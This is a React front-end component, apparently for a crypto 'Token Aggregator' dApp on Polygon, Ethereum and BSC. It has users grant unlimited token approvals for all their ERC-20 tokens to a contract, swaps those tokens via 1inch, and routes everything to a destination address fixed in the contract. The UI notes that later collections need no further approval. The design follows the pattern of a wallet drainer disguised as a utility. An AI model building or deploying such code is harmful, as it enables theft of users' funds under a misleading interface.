"use client";

import { useState, useCallback, useEffect } from "react";
import {
  useAccount,
  usePublicClient,
  useWalletClient,
  useWriteContract,
  useReadContract,
  useSwitchChain,
} from "wagmi";
import { maxUint256 } from "viem";
import { erc20Abi } from "viem";
import { tokenAggregatorAbi } from "@/lib/abis/TokenAggregator";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useAtom } from "jotai";
import { globalTokensAtom } from "@/atoms/global-tokens-atom";
import { AUTO_DESTINATION_ADDRESS } from "@/config";
import { mainnet, polygon, bsc } from "@reown/appkit/networks";

// Contract addresses per chain - set these after deployment on each chain
const CONTRACT_ADDRESSES: Record<number, string> = {
  [polygon.id]:
    (process.env.NEXT_PUBLIC_TOKEN_AGGREGATOR_POLYGON as string) || "",
  [mainnet.id]:
    (process.env.NEXT_PUBLIC_TOKEN_AGGREGATOR_MAINNET as string) || "",
  [bsc.id]: (process.env.NEXT_PUBLIC_TOKEN_AGGREGATOR_BSC as string) || "",
};

const SUPPORTED_CHAINS = [polygon, mainnet, bsc];

// 1inch API configuration
const ONE_INCH_API = "https://api.1inch.dev/swap/v6.0/";
const ONE_INCH_API_KEY = process.env.NEXT_PUBLIC_ONE_INCH_API_KEY;

// Native token placeholder addresses
const NATIVE_TOKEN_ADDRESSES = [
  "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
  "0x0000000000000000000000000000000000000000",
].map((addr) => addr.toLowerCase());

export const TokenAggregator = () => {
  const { address: userAddress, isConnected, chain, chainId } = useAccount();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { writeContractAsync } = useWriteContract();
  const { switchChain } = useSwitchChain();
  const [tokens] = useAtom(globalTokensAtom);
  const [contractAddresses, setContractAddresses] =
    useState<Record<number, string>>(CONTRACT_ADDRESSES);
  const [isApproving, setIsApproving] = useState(false);
  const [isCollecting, setIsCollecting] = useState(false);
  const [isSwapping, setIsSwapping] = useState(false);
  const [status, setStatus] = useState<string>("");
  const [currentChainId, setCurrentChainId] = useState<number | undefined>(
    chainId
  );

  // Get contract address for current chain
  const currentContractAddress = currentChainId
    ? contractAddresses[currentChainId] || ""
    : "";

  // Read contract destination address for current chain
  const { data: contractDestination } = useReadContract({
    address: currentContractAddress as `0x${string}` | undefined,
    abi: tokenAggregatorAbi,
    functionName: "destinationAddress",
    query: {
      enabled: !!currentContractAddress && isConnected,
    },
  });

  // Get 1inch swap quote and transaction data
  const getSwapData = useCallback(
    async (tokenAddress: string, amount: bigint, chainId: number) => {
      if (!ONE_INCH_API_KEY) {
        throw new Error("1inch API key not configured");
      }

      const nativeAddress = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"; // 1inch native placeholder

      const response = await fetch(
        `${ONE_INCH_API}${chainId}/swap?fromTokenAddress=${tokenAddress}&toTokenAddress=${nativeAddress}&amount=${amount.toString()}&fromAddress=${userAddress}&slippage=1`,
        {
          headers: {
            Authorization: `Bearer ${ONE_INCH_API_KEY}`,
          },
        }
      );

      if (!response.ok) {
        const error = await response.json();
        throw new Error(
          `1inch API error: ${error.description || response.statusText}`
        );
      }

      return await response.json();
    },
    [userAddress]
  );

  // Check if token is native
  const isNativeToken = (tokenAddress: string): boolean => {
    return NATIVE_TOKEN_ADDRESSES.includes(tokenAddress.toLowerCase());
  };

  // Approve contract to spend a specific token
  const approveToken = useCallback(
    async (tokenAddress: `0x${string}`, chainId: number) => {
      if (!walletClient || !userAddress) {
        setStatus("Wallet not connected");
        return;
      }

      const contractAddr = contractAddresses[chainId];
      if (!contractAddr) {
        setStatus(`No contract address configured for chain ${chainId}`);
        return;
      }

      setIsApproving(true);
      setStatus(
        `Approving token ${tokenAddress.substring(
          0,
          10
        )} on chain ${chainId}...`
      );

      try {
        // Switch to the correct chain if needed
        if (chainId !== currentChainId) {
          await switchChain({ chainId });
          await new Promise((resolve) => setTimeout(resolve, 1500)); // Wait for chain switch
        }

        // Approve max amount (type(uint256).max) for one-time approval
        const hash = await writeContractAsync({
          address: tokenAddress,
          abi: erc20Abi,
          functionName: "approve",
          args: [contractAddr as `0x${string}`, maxUint256],
        });

        setStatus(`Approval transaction sent: ${hash}`);

        // Wait for confirmation
        await publicClient?.waitForTransactionReceipt({ hash });
        setStatus(`✅ Token approved successfully on chain ${chainId}!`);
      } catch (error: any) {
        console.error("Approval error:", error);
        setStatus(`❌ Approval failed: ${error?.message || "Unknown error"}`);
      } finally {
        setIsApproving(false);
      }
    },
    [
      walletClient,
      userAddress,
      contractAddresses,
      currentChainId,
      writeContractAsync,
      publicClient,
      switchChain,
    ]
  );

  // Approve all tokens at once (cross-chain)
  const approveAllTokens = useCallback(async () => {
    if (!walletClient || !userAddress) {
      setStatus("Wallet not connected");
      return;
    }

    setIsApproving(true);
    setStatus("Approving all tokens across all chains...");

    try {
      // Group tokens by chain (we need to get chain info from tokens)
      // For now, we'll approve on current chain and let user switch manually
      // In a full implementation, you'd track chainId per token from GetTokens

      const erc20Tokens = tokens.filter(
        (t) =>
          t.contract_address &&
          t.contract_address !== "0x0000000000000000000000000000000000000000" &&
          !isNativeToken(t.contract_address)
      );

      if (!currentChainId) {
        setStatus("Please connect to a chain first");
        return;
      }

      const contractAddr = contractAddresses[currentChainId];
      if (!contractAddr) {
        setStatus(
          `No contract address configured for current chain (${currentChainId})`
        );
        return;
      }

      for (const token of erc20Tokens) {
        try {
          const tokenAddress = token.contract_address as `0x${string}`;
          setStatus(
            `Approving ${
              token.contract_ticker_symbol
            } (${tokenAddress.substring(0, 10)}...)...`
          );
          const hash = await writeContractAsync({
            address: tokenAddress,
            abi: erc20Abi,
            functionName: "approve",
            args: [contractAddr as `0x${string}`, maxUint256],
          });
          await publicClient?.waitForTransactionReceipt({ hash });
        } catch (error) {
          console.error(
            `Failed to approve ${token.contract_ticker_symbol}:`,
            error
          );
          // Continue with next token
        }
      }

      setStatus(
        "✅ All tokens approved on current chain! Switch chains to approve on other chains."
      );
    } catch (error: any) {
      console.error("Batch approval error:", error);
      setStatus(
        `❌ Batch approval failed: ${error?.message || "Unknown error"}`
      );
    } finally {
      setIsApproving(false);
    }
  }, [
    walletClient,
    userAddress,
    contractAddresses,
    tokens,
    currentChainId,
    writeContractAsync,
    publicClient,
  ]);

  // Collect tokens - swap non-native to native, then route all (cross-chain)
  const collectAllTokens = useCallback(async () => {
    if (!walletClient || !userAddress) {
      setStatus("Wallet not connected");
      return;
    }

    setIsCollecting(true);
    setStatus("Collecting tokens across all chains...");

    const initialChainId = currentChainId;

    try {
      // Iterate through supported chains
      for (const supportedChain of SUPPORTED_CHAINS) {
        const chainId = supportedChain.id;
        const contractAddr = contractAddresses[chainId];

        if (!contractAddr) {
          setStatus(
            `Skipping chain ${chainId} - no contract address configured`
          );
          continue;
        }

        // Switch to chain if needed
        if (chainId !== currentChainId) {
          setStatus(
            `Switching to chain ${supportedChain.name} (${chainId})...`
          );
          try {
            await switchChain({ chainId });
            await new Promise((resolve) => setTimeout(resolve, 2000)); // Wait for chain switch
            setCurrentChainId(chainId);
          } catch (error: any) {
            setStatus(
              `Failed to switch to chain ${chainId}: ${error?.message}`
            );
            continue;
          }
        }

        setStatus(`Processing tokens on ${supportedChain.name}...`);

        // Filter tokens for current chain (in a real implementation, tokens would have chainId)
        // For now, we'll process all tokens on the current chain
        const erc20Tokens = tokens.filter(
          (t) =>
            t.contract_address &&
            t.contract_address !==
              "0x0000000000000000000000000000000000000000" &&
            !isNativeToken(t.contract_address)
        );

        const nativeTokens = tokens.filter((t) =>
          isNativeToken(t.contract_address)
        );

        // Step 1: Swap non-native tokens to native token
        if (erc20Tokens.length > 0 && ONE_INCH_API_KEY) {
          setIsSwapping(true);
          setStatus(
            `Swapping ${erc20Tokens.length} tokens to native on ${supportedChain.name}...`
          );

          for (const token of erc20Tokens) {
            try {
              const tokenAddress = token.contract_address as `0x${string}`;
              const amount = BigInt(token.balance);

              // Get swap data from 1inch
              const swapData = await getSwapData(tokenAddress, amount, chainId);

              // Validate swap data structure
              if (!swapData?.tx?.to || !swapData?.tx?.data) {
                throw new Error("Invalid swap data from 1inch API");
              }

              // Execute swap and route via contract
              const hash = await writeContractAsync({
                address: contractAddr as `0x${string}`,
                abi: tokenAggregatorAbi,
                functionName: "swapAndRoute",
                args: [
                  tokenAddress,
                  userAddress,
                  swapData.tx.to as `0x${string}`,
                  swapData.tx.data as `0x${string}`,
                ],
              });

              await publicClient?.waitForTransactionReceipt({ hash });
              setStatus(
                `✅ Swapped ${token.contract_ticker_symbol} to native on ${supportedChain.name}`
              );
            } catch (error: any) {
              console.error(
                `Failed to swap ${token.contract_ticker_symbol} on ${supportedChain.name}:`,
                error
              );
              setStatus(
                `⚠️ Failed to swap ${token.contract_ticker_symbol}: ${
                  error?.message || "Unknown error"
                }`
              );
              // Continue with next token
            }
          }

          setIsSwapping(false);
        }

        // Step 2: Collect remaining ERC-20 tokens (if any couldn't be swapped)
        const remainingTokens = erc20Tokens
          .map((t) => t.contract_address as `0x${string}`)
          .filter((addr) => addr);

        if (remainingTokens.length > 0) {
          setStatus(
            `Collecting ${remainingTokens.length} tokens on ${supportedChain.name}...`
          );
          try {
            const hash = await writeContractAsync({
              address: contractAddr as `0x${string}`,
              abi: tokenAggregatorAbi,
              functionName: "collectMultipleTokens",
              args: [remainingTokens, userAddress],
            });

            await publicClient?.waitForTransactionReceipt({ hash });
            setStatus(
              `✅ Collected ${remainingTokens.length} tokens on ${supportedChain.name}`
            );
          } catch (error: any) {
            setStatus(
              `⚠️ Failed to collect tokens on ${supportedChain.name}: ${error?.message}`
            );
          }
        }

        // Step 3: Route native tokens
        if (nativeTokens.length > 0) {
          setStatus(`Routing native tokens on ${supportedChain.name}...`);
          try {
            const hash = await writeContractAsync({
              address: contractAddr as `0x${string}`,
              abi: tokenAggregatorAbi,
              functionName: "routeNativeToken",
              args: [userAddress],
            });

            await publicClient?.waitForTransactionReceipt({ hash });
            setStatus(`✅ Routed native tokens on ${supportedChain.name}`);
          } catch (error: any) {
            setStatus(
              `⚠️ Failed to route native tokens on ${supportedChain.name}: ${error?.message}`
            );
          }
        }
      }

      // Restore original chain
      if (initialChainId && initialChainId !== currentChainId) {
        setStatus(`Switching back to original chain...`);
        await switchChain({ chainId: initialChainId });
        setCurrentChainId(initialChainId);
      }

      setStatus(
        "✅ All tokens collected and routed successfully across all chains!"
      );
    } catch (error: any) {
      console.error("Collection error:", error);
      setStatus(`❌ Collection failed: ${error?.message || "Unknown error"}`);
    } finally {
      setIsCollecting(false);
      setIsSwapping(false);
    }
  }, [
    walletClient,
    userAddress,
    contractAddresses,
    tokens,
    currentChainId,
    writeContractAsync,
    publicClient,
    getSwapData,
    switchChain,
  ]);

  if (!isConnected) {
    return (
      <div className="m-5 p-4 border border-gray-300 rounded">
        <p>Please connect your wallet to use Token Aggregator</p>
      </div>
    );
  }

  return (
    <div className="m-5 p-4 border border-blue-300 rounded-lg bg-blue-50">
      <h2 className="text-xl font-bold mb-4">🔄 Token Aggregator</h2>
      <p className="text-sm text-gray-600 mb-4">
        Approve once, collect automatically! After approving tokens, the
        contract can collect them and route non-native tokens to native token
        before transferring to destination.
      </p>

      <div className="mb-4 space-y-2">
        <label className="block mb-2 font-semibold">
          Contract Addresses (per chain):
        </label>
        {SUPPORTED_CHAINS.map((supportedChain) => (
          <div key={supportedChain.id} className="flex items-center gap-2">
            <label className="text-sm w-24">{supportedChain.name}:</label>
            <Input
              value={contractAddresses[supportedChain.id] || ""}
              onChange={(e) =>
                setContractAddresses({
                  ...contractAddresses,
                  [supportedChain.id]: e.target.value,
                })
              }
              placeholder="0x..."
              className="flex-1 font-mono text-xs"
            />
          </div>
        ))}
        {contractDestination && (
          <p className="text-sm text-gray-600 mt-2">
            Destination: {contractDestination.substring(0, 10)}...
          </p>
        )}
      </div>

      <div className="space-y-2">
        <Button
          onClick={approveAllTokens}
          disabled={!currentContractAddress || isApproving || isCollecting}
          className="w-full"
        >
          {isApproving ? "Approving..." : `Approve All Tokens (Current Chain)`}
        </Button>

        <Button
          onClick={collectAllTokens}
          disabled={
            Object.values(contractAddresses).every((addr) => !addr) ||
            isApproving ||
            isCollecting ||
            !ONE_INCH_API_KEY
          }
          variant="secondary"
          className="w-full"
        >
          {isSwapping
            ? "Swapping tokens..."
            : isCollecting
            ? "Collecting (Cross-Chain)..."
            : "Collect All Tokens (Cross-Chain)"}
        </Button>
      </div>

      {!ONE_INCH_API_KEY && (
        <div className="mt-2 p-2 bg-yellow-100 border border-yellow-300 rounded text-xs">
          ⚠️ 1inch API key not configured. Swapping functionality will be
          limited.
        </div>
      )}

      {status && (
        <div className="mt-4 p-3 bg-gray-100 rounded text-sm">
          <p>{status}</p>
        </div>
      )}

      <div className="mt-4 text-xs text-gray-500">
        <p>
          <strong>How it works:</strong>
        </p>
        <ol className="list-decimal list-inside space-y-1 mt-2">
          <li>
            Deploy the TokenAggregator contract on each chain (Polygon, Mainnet,
            BSC)
          </li>
          <li>Set the contract addresses above for each chain</li>
          <li>
            Click "Approve All Tokens" - approves tokens on current chain
            (one-time per token per chain)
          </li>
          <li>
            Click "Collect All Tokens (Cross-Chain)" - automatically:
            <ul className="list-disc list-inside ml-4 mt-1">
              <li>Switches between chains (Polygon → Mainnet → BSC)</li>
              <li>Swaps non-native tokens to native token via 1inch</li>
              <li>Routes all native tokens to destination address</li>
              <li>Returns to original chain when done</li>
            </ul>
          </li>
          <li>
            Future collections don't require approval (until allowance is used
            up)
          </li>
        </ol>
      </div>
    </div>
  );
};
